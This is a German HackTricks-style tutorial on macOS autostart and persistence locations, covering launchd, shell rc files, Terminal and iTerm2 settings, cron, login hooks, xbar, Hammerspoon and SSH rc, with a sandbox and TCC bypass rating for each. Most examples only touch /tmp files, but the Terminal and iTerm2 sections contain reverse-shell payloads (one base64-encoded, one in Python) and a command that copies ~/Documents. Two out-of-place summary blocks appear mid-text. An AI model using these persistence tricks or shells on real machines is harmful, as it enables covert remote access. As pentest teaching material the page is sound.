# macOS Auto Start

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>

Dieser Abschnitt basiert stark auf der Blog-Serie [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), das Ziel ist es, **weitere Autostart-Standorte** hinzuzufügen (wenn möglich), anzuzeigen, **welche Techniken heutzutage noch funktionieren** mit der neuesten Version von macOS (13.4) und die **erforderlichen Berechtigungen** anzugeben.

## Sandbox-Umgehung

{% hint style="success" %}
Hier finden Sie Startorte, die für die **Sandbox-Umgehung** nützlich sind, die es Ihnen ermöglichen, einfach etwas auszuführen, indem Sie es in eine Datei schreiben und auf eine sehr **übliche Aktion**, eine bestimmte **Zeitmenge** oder eine **Aktion warten, die Sie normalerweise** innerhalb einer Sandbox ausführen können, ohne Root-Berechtigungen zu benötigen.
{% endhint %}

### Launchd

* Nützlich zur Umgehung der Sandbox: [✅](https://emojipedia.org/check-mark-button)
* TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Standorte

* **`/Library/LaunchAgents`**
* **Auslöser**: Neustart
* Root erforderlich
* **`/Library/LaunchDaemons`**
* **Auslöser**: Neustart
* Root erforderlich
* **`/System/Library/LaunchAgents`**
* **Auslöser**: Neustart
* Root erforderlich
* **`/System/Library/LaunchDaemons`**
* **Auslöser**: Neustart
* Root erforderlich
* **`~/Library/LaunchAgents`**
* **Auslöser**: Neu anmelden
* **`~/Library/LaunchDemons`**
* **Auslöser**: Neu anmelden

#### Beschreibung & Ausnutzung

**`launchd`** ist der **erste Prozess**, der vom OX S-Kernel beim Start ausgeführt wird und der letzte, der beim Herunterfahren endet. Es sollte immer die **PID 1** haben. Dieser Prozess wird die in den **ASEP-Plists** angegebenen Konfigurationen in folgenden Verzeichnissen **lesen und ausführen**:

* `/Library/LaunchAgents`: Vom Administrator installierte benutzerbezogene Agenten
* `/Library/LaunchDaemons`: Systemweite Daemons, die vom Administrator installiert wurden
* `/System/Library/LaunchAgents`: Vom Apple bereitgestellte benutzerbezogene Agenten.
* `/System/Library/LaunchDaemons`: Vom Apple bereitgestellte systemweite Daemons.

Wenn sich ein Benutzer anmeldet, werden die in `/Users/$USER/Library/LaunchAgents` und `/Users/$USER/Library/LaunchDemons` befindlichen Plists mit den **Berechtigungen der angemeldeten Benutzer** gestartet.

Der **Hauptunterschied zwischen Agenten und Daemons besteht darin, dass Agenten geladen werden, wenn sich der Benutzer anmeldet, und die Daemons beim Systemstart geladen werden** (da Dienste wie ssh ausgeführt werden müssen, bevor ein Benutzer auf das System zugreift). Außerdem können Agenten die GUI verwenden, während Daemons im Hintergrund ausgeführt werden müssen.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Es gibt Fälle, in denen ein **Agent ausgeführt werden muss, bevor sich der Benutzer anmeldet**, diese werden als **PreLoginAgents** bezeichnet. Zum Beispiel ist dies nützlich, um unterstützende Technologien beim Login bereitzustellen. Sie können auch in `/Library/LaunchAgents` gefunden werden (siehe [**hier**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) ein Beispiel).

{% hint style="info" %}
Neue Daemon- oder Agentenkonfigurationsdateien werden **nach dem nächsten Neustart geladen oder mit** `launchctl load <target.plist>` **geladen**. Es ist **auch möglich, .plist-Dateien ohne diese Erweiterung zu laden** mit `launchctl -F <file>` (jedoch werden diese plist-Dateien nach dem Neustart nicht automatisch geladen).\
Es ist auch möglich, **zu entladen** mit `launchctl unload <target.plist>` (der Prozess, auf den es zeigt, wird beendet).

Um **sicherzustellen**, dass nichts (wie eine Überschreibung) **das Ausführen eines Agenten oder Daemons verhindert**, führen Sie aus: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`
{% endhint %}

Liste alle Agenten und Daemons auf, die vom aktuellen Benutzer geladen wurden:
```bash
launchctl list
```
{% hint style="warning" %}
Wenn ein plist im Besitz eines Benutzers ist, auch wenn es sich in einem systemweiten Daemon-Ordner befindet, wird die Aufgabe als Benutzer und nicht als Root ausgeführt. Dies kann einige Privilege-Escalation-Angriffe verhindern.
{% endhint%}

### Shell-Startdateien

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

* Nützlich zur Umgehung der Sandbox: [✅](https://emojipedia.org/check-mark-button)
* TCC-Umgehung: [✅](https://emojipedia.org/check-mark-button)
* Aber Sie müssen eine App mit einer TCC-Umgehung finden, die eine Shell ausführt, die diese Dateien lädt

#### Standorte

* **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
* **Auslöser**: Öffnen Sie ein Terminal mit zsh
* **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
* **Auslöser**: Öffnen Sie ein Terminal mit zsh
* Root erforderlich
* **`~/.zlogout`**
* **Auslöser**: Beenden Sie ein Terminal mit zsh
* **`/etc/zlogout`**
* **Auslöser**: Beenden Sie ein Terminal mit zsh
* Root erforderlich
* Möglicherweise mehr in: **`man zsh`**
* **`~/.bashrc`**
* **Auslöser**: Öffnen Sie ein Terminal mit bash
* `/etc/profile` (funktionierte nicht)
* `~/.profile` (funktionierte nicht)
* `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
* **Auslöser**: Sollte mit xterm ausgelöst werden, aber es **ist nicht installiert** und selbst nach der Installation wird dieser Fehler angezeigt: xterm: `DISPLAY is not set`

#### Beschreibung & Ausnutzung

Beim Initialisieren einer Shell-Umgebung wie `zsh` oder `bash` werden **bestimmte Startdateien ausgeführt**. macOS verwendet derzeit `/bin/zsh` als Standardshell. Diese Shell wird automatisch aufgerufen, wenn die Terminalanwendung gestartet wird oder wenn auf ein Gerät über SSH zugegriffen wird. Obwohl `bash` und `sh` auch in macOS vorhanden sind, müssen sie explizit aufgerufen werden, um verwendet zu werden.

Die Manpage von zsh, die wir mit **`man zsh`** lesen können, enthält eine ausführliche Beschreibung der Startdateien.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Wiedereröffnete Anwendungen

{% hint style="danger" %}
Die Konfiguration der angegebenen Ausnutzung und das Aus- und Einloggen oder sogar das Neustarten haben bei mir nicht funktioniert, um die App auszuführen. (Die App wurde nicht ausgeführt, vielleicht muss sie ausgeführt werden, wenn diese Aktionen durchgeführt werden)
{% endhint %}

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)

* Nützlich zur Umgehung der Sandbox: [✅](https://emojipedia.org/check-mark-button)
* TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Ort

* **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
* **Auslöser**: Neustart der wieder zu öffnenden Anwendungen

#### Beschreibung & Ausnutzung

Alle Anwendungen, die wieder geöffnet werden sollen, befinden sich in der Plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Um also die wieder zu öffnenden Anwendungen dazu zu bringen, Ihre eigene zu starten, müssen Sie nur **Ihre App zur Liste hinzufügen**.

Die UUID kann gefunden werden, indem Sie dieses Verzeichnis auflisten oder mit `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Um die Anwendungen zu überprüfen, die wieder geöffnet werden, können Sie Folgendes tun:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Um **eine Anwendung zu dieser Liste hinzuzufügen**, können Sie Folgendes verwenden:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal Einstellungen

* Nützlich um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
* TCC Umgehung: [✅](https://emojipedia.org/check-mark-button)
* Terminal verwendet FDA-Berechtigungen des Benutzers, der es verwendet

#### Ort

* **`~/Library/Preferences/com.apple.Terminal.plist`**
* **Auslöser**: Terminal öffnen

#### Beschreibung & Ausnutzung

In **`~/Library/Preferences`** werden die Einstellungen des Benutzers in den Anwendungen gespeichert. Einige dieser Einstellungen können eine Konfiguration enthalten, um **andere Anwendungen/Scripts auszuführen**.

Zum Beispiel kann das Terminal einen Befehl beim Start ausführen:

<figure><img src="../.gitbook/assets/image (676).png" alt="" width="495"><figcaption></figcaption></figure>

Diese Konfiguration wird in der Datei **`~/Library/Preferences/com.apple.Terminal.plist`** wie folgt widergespiegelt:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Also, wenn die Plist der Einstellungen des Terminals im System überschrieben werden könnte, kann die **`open`**-Funktionalität verwendet werden, um das Terminal zu öffnen und dieser Befehl wird ausgeführt.

Sie können dies über die Befehlszeile hinzufügen:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
{% endcode %}

### Terminal Skripte / Andere Dateierweiterungen

* Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
* TCC-Umgehung: [✅](https://emojipedia.org/check-mark-button)
* Terminal verwendet FDA-Berechtigungen des Benutzers, der es verwendet

#### Ort

* **Überall**
* **Auslöser**: Öffnen Sie das Terminal

#### Beschreibung & Ausnutzung

Wenn Sie ein [**`.terminal`** Skript](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) erstellen und öffnen, wird die **Terminal-Anwendung** automatisch aufgerufen, um die darin angegebenen Befehle auszuführen. Wenn die Terminal-App über besondere Berechtigungen verfügt (wie TCC), wird Ihr Befehl mit diesen besonderen Berechtigungen ausgeführt.

Probieren Sie es aus:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
### Audio-Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

* Nützlich zur Umgehung der Sandbox: [✅](https://emojipedia.org/check-mark-button)
* TCC-Umgehung: [🟠](https://emojipedia.org/large-orange-circle)
* Möglicherweise zusätzlicher TCC-Zugriff

#### Standort

* **`/Library/Audio/Plug-Ins/HAL`**
* Benötigt Root-Zugriff
* **Auslöser**: Neustart von coreaudiod oder des Computers
* **`/Library/Audio/Plug-ins/Components`**
* Benötigt Root-Zugriff
* **Auslöser**: Neustart von coreaudiod oder des Computers
* **`~/Library/Audio/Plug-ins/Components`**
* **Auslöser**: Neustart von coreaudiod oder des Computers
* **`/System/Library/Components`**
* Benötigt Root-Zugriff
* **Auslöser**: Neustart von coreaudiod oder des Computers

#### Beschreibung

Laut den vorherigen Writeups ist es möglich, **einige Audio-Plugins zu kompilieren** und sie zu laden.

### QuickLook-Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)

* Nützlich zur Umgehung der Sandbox: [✅](https://emojipedia.org/check-mark-button)
* TCC-Umgehung: [🟠](https://emojipedia.org/large-orange-circle)
* Möglicherweise zusätzlicher TCC-Zugriff

#### Standort

* `/System/Library/QuickLook`
* `/Library/QuickLook`
* `~/Library/QuickLook`
* `/Applications/AppNameHere/Contents/Library/QuickLook/`
* `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Beschreibung & Ausnutzung

QuickLook-Plugins können ausgeführt werden, wenn Sie die **Vorschau einer Datei auslösen** (Leertaste drücken, wenn die Datei in Finder ausgewählt ist) und ein **Plugin, das diesen Dateityp unterstützt**, installiert ist.

Es ist möglich, Ihr eigenes QuickLook-Plugin zu kompilieren, es an einem der vorherigen Standorte zu platzieren, es zu laden und dann zu einer unterstützten Datei zu gehen und die Leertaste zu drücken, um es auszulösen.

### ~~Anmelde-/Abmelde-Hooks~~

{% hint style="danger" %}
Das hat bei mir nicht funktioniert, weder mit dem Benutzer-LoginHook noch mit dem Root-LogoutHook
{% endhint %}

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)

* Nützlich zur Umgehung der Sandbox: [✅](https://emojipedia.org/check-mark-button)
* TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Standort

* Sie müssen in der Lage sein, etwas wie `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` auszuführen
* `Lo`kalisierung in `~/Library/Preferences/com.apple.loginwindow.plist`

Sie sind veraltet, können aber verwendet werden, um Befehle auszuführen, wenn sich ein Benutzer anmeldet.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Diese Einstellung wird in `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` gespeichert.
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Um es zu löschen:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Der Root-Benutzer wird in **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`** gespeichert.

## Bedingte Sandbox-Umgehung

{% hint style="success" %}
Hier finden Sie Startorte, die nützlich sind für die **Sandbox-Umgehung**, die es Ihnen ermöglicht, einfach etwas auszuführen, indem Sie es in eine Datei schreiben und nicht allzu häufige Bedingungen erwarten, wie spezifische installierte **Programme, "ungewöhnliche" Benutzer**-Aktionen oder Umgebungen.
{% endhint %}

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)

* Nützlich zur Umgehung der Sandbox: [✅](https://emojipedia.org/check-mark-button)
* Sie müssen jedoch in der Lage sein, das `crontab`-Binär auszuführen
* Oder Root sein
* TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Ort

* **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
* Root-Zugriff für direkten Schreibzugriff erforderlich. Kein Root-Zugriff erforderlich, wenn Sie `crontab <Datei>` ausführen können
* **Auslöser**: Abhängig von der Cron-Job

#### Beschreibung & Ausnutzung

Liste die Cron-Jobs des **aktuellen Benutzers** auf mit:
```bash
crontab -l
```
Du kannst auch alle Cron-Jobs der Benutzer in **`/usr/lib/cron/tabs/`** und **`/var/at/tabs/`** (benötigt Root-Zugriff) einsehen.

In MacOS können mehrere Ordner gefunden werden, die Skripte mit **bestimmter Häufigkeit** ausführen:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Hier finden Sie die regulären **cron-Jobs**, die **at-Jobs** (die nicht sehr häufig verwendet werden) und die **periodischen Jobs** (hauptsächlich zur Bereinigung temporärer Dateien). Die täglichen periodischen Jobs können beispielsweise mit dem Befehl ausgeführt werden: `periodic daily`.

Um **benutzerdefinierte Cron-Jobs programmgesteuert hinzuzufügen**, ist es möglich, zu verwenden:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)

* Nützlich zur Umgehung der Sandbox: [✅](https://emojipedia.org/check-mark-button)
* TCC-Umgehung: [✅](https://emojipedia.org/check-mark-button)
* iTerm2 hatte zuvor TCC-Berechtigungen erteilt

#### Standorte

* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
* **Auslöser**: iTerm öffnen
* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
* **Auslöser**: iTerm öffnen
* **`~/Library/Preferences/com.googlecode.iterm2.plist`**
* **Auslöser**: iTerm öffnen

#### Beschreibung & Ausnutzung

Skripte, die in **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** gespeichert sind, werden ausgeführt. Zum Beispiel:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
```markdown
### macOS Auto-Start Locations

#### Launch Agents

Launch Agents are used to run commands when a user logs in. They are stored in the following directories:

- `/Library/LaunchAgents/`
- `/System/Library/LaunchAgents/`
- `~/Library/LaunchAgents/`

#### Launch Daemons

Launch Daemons are used to run commands at system startup. They are stored in the following directories:

- `/Library/LaunchDaemons/`
- `/System/Library/LaunchDaemons/`

#### Login Items

Login Items are applications that open when a user logs in. They can be managed in:

- System Preferences > Users & Groups > Login Items

#### Startup Items

Startup Items are legacy items that automatically launch when a user logs in. They are stored in:

- `/Library/StartupItems/`

#### Cron Jobs

Cron Jobs are scheduled tasks that run at specific times. They can be managed using the `crontab` command.

#### XPC Services

XPC Services are helper tools that can be automatically launched by applications. They are defined in the application's Info.plist file.

#### Kernel Extensions

Kernel Extensions are low-level modules that can be loaded at system startup. They are stored in:

- `/Library/Extensions/`
- `/System/Library/Extensions/`
```
```html
### macOS Auto-Start-Standorte

#### Start-Agenten

Start-Agenten werden verwendet, um Befehle auszuführen, wenn sich ein Benutzer anmeldet. Sie werden in den folgenden Verzeichnissen gespeichert:

- `/Library/LaunchAgents/`
- `/System/Library/LaunchAgents/`
- `~/Library/LaunchAgents/`

#### Start-Daemons

Start-Daemons werden verwendet, um Befehle beim Systemstart auszuführen. Sie werden in den folgenden Verzeichnissen gespeichert:

- `/Library/LaunchDaemons/`
- `/System/Library/LaunchDaemons/`

#### Anmeldeobjekte

Anmeldeobjekte sind Anwendungen, die geöffnet werden, wenn sich ein Benutzer anmeldet. Sie können verwaltet werden unter:

- Systemeinstellungen > Benutzer & Gruppen > Anmeldeobjekte

#### Startobjekte

Startobjekte sind veraltete Elemente, die automatisch geöffnet werden, wenn sich ein Benutzer anmeldet. Sie werden gespeichert in:

- `/Library/StartupItems/`

#### Cron-Jobs

Cron-Jobs sind geplante Aufgaben, die zu bestimmten Zeiten ausgeführt werden. Sie können mit dem Befehl `crontab` verwaltet werden.

#### XPC-Services

XPC-Services sind Hilfsprogramme, die von Anwendungen automatisch gestartet werden können. Sie sind in der Info.plist-Datei der Anwendung definiert.

#### Kernel-Erweiterungen

Kernel-Erweiterungen sind Module auf niedriger Ebene, die beim Systemstart geladen werden können. Sie werden gespeichert in:

- `/Library/Extensions/`
- `/System/Library/Extensions/`
```
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Das Skript **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** wird ebenfalls ausgeführt:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Die iTerm2-Einstellungen in **`~/Library/Preferences/com.googlecode.iterm2.plist`** können **einen Befehl anzeigen, der ausgeführt werden soll**, wenn das iTerm2-Terminal geöffnet wird.

Diese Einstellung kann in den iTerm2-Einstellungen konfiguriert werden:

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

Und der Befehl wird in den Einstellungen widergespiegelt:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Sie können den Befehl zum Ausführen festlegen mit:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
{% endcode %}

{% hint style="warning" %}
Es ist sehr wahrscheinlich, dass es **andere Möglichkeiten gibt, die iTerm2-Einstellungen** zu missbrauchen, um beliebige Befehle auszuführen.
{% endhint %}

### xbar

Bericht: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)

* Nützlich zur Umgehung der Sandbox: [✅](https://emojipedia.org/check-mark-button)
* Aber xbar muss installiert sein
* TCC-Umgehung: [✅](https://emojipedia.org/check-mark-button)
* Es fordert Zugriffsberechtigungen für die Bedienungshilfen an

#### Ort

* **`~/Library/Application\ Support/xbar/plugins/`**
* **Auslöser**: Sobald xbar ausgeführt wird

#### Beschreibung

Wenn das beliebte Programm [**xbar**](https://github.com/matryer/xbar) installiert ist, ist es möglich, ein Shell-Skript in **`~/Library/Application\ Support/xbar/plugins/`** zu schreiben, das ausgeführt wird, wenn xbar gestartet wird:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)

* Nützlich zur Umgehung der Sandbox: [✅](https://emojipedia.org/check-mark-button)
* Aber Hammerspoon muss installiert sein
* TCC-Umgehung: [✅](https://emojipedia.org/check-mark-button)
* Es fordert Zugriffsberechtigungen für Bedienungshilfen an

#### Standort

* **`~/.hammerspoon/init.lua`**
* **Auslöser**: Sobald Hammerspoon ausgeführt wird

#### Beschreibung

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) dient als Automatisierungsplattform für **macOS** und nutzt die **LUA-Skriptsprache** für seine Operationen. Es unterstützt die Integration von vollständigem AppleScript-Code und die Ausführung von Shell-Skripten, was seine Skripting-Fähigkeiten erheblich verbessert.

Die App sucht nach einer einzigen Datei, `~/.hammerspoon/init.lua`, und wenn sie gestartet wird, wird das Skript ausgeführt.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

* Nützlich zur Umgehung der Sandbox: [✅](https://emojipedia.org/check-mark-button)
* Aber BetterTouchTool muss installiert sein
* TCC-Umgehung: [✅](https://emojipedia.org/check-mark-button)
* Es fordert Berechtigungen für Automation-Shortcuts und Zugänglichkeit an

#### Standort

* `~/Library/Application Support/BetterTouchTool/*`

Dieses Tool ermöglicht es, Anwendungen oder Skripte anzugeben, die ausgeführt werden sollen, wenn bestimmte Tastenkombinationen gedrückt werden. Ein Angreifer könnte seine eigene **Tastenkombination und Aktion in der Datenbank konfigurieren**, um beliebigen Code auszuführen (eine Tastenkombination könnte einfach das Drücken einer Taste sein).

### Alfred

* Nützlich zur Umgehung der Sandbox: [✅](https://emojipedia.org/check-mark-button)
* Aber Alfred muss installiert sein
* TCC-Umgehung: [✅](https://emojipedia.org/check-mark-button)
* Es fordert Berechtigungen für Automation, Zugänglichkeit und sogar Vollzugriff auf den Datenträger an

#### Standort

* `???`

Es ermöglicht das Erstellen von Workflows, die Code ausführen können, wenn bestimmte Bedingungen erfüllt sind. Möglicherweise ist es für einen Angreifer möglich, eine Workflow-Datei zu erstellen und Alfred dazu zu bringen, sie zu laden (es ist erforderlich, die Premium-Version zu bezahlen, um Workflows zu verwenden).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)

* Nützlich zur Umgehung der Sandbox: [✅](https://emojipedia.org/check-mark-button)
* Aber SSH muss aktiviert und verwendet werden
* TCC-Umgehung: [✅](https://emojipedia.org/check-mark-button)
* SSH hatte FDA-Zugriff

#### Standort

* **`~/.ssh/rc`**
* **Auslöser**: Anmeldung über SSH
* **`/etc/ssh/sshrc`**
* Benötigt Root-Rechte
* **Auslöser**: Anmeldung über SSH

{% hint style="danger" %}
Um SSH zu aktivieren, sind Vollzugriffsrechte erforderlich:
```bash
sudo systemsetup -setremotelogin on
```
{% endhint %}

#### Beschreibung & Ausnutzung

Standardmäßig werden, es sei denn `PermitUserRC no` in `/etc/ssh/sshd_config` gesetzt ist, beim **Einloggen über SSH** die Skripte **`/etc/ssh/sshrc`** und **`~/.ssh/rc`** ausgeführt.

### **Anmeldeobjekte**

Writeup: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)

* Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
* Aber Sie müssen `osascript` mit Argumenten ausführen
* TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Standorte

* **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
* **Auslöser:** Anmeldung
* Ausnutzungspayload wird durch Aufruf von **`osascript`** gespeichert
* **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
* **Auslöser:** Anmeldung
* Root-Berechtigung erforderlich

#### Beschreibung

In Systemeinstellungen -> Benutzer & Gruppen -> **Anmeldeobjekte** finden Sie **Objekte, die beim Benutzerlogin ausgeführt werden sollen**.\
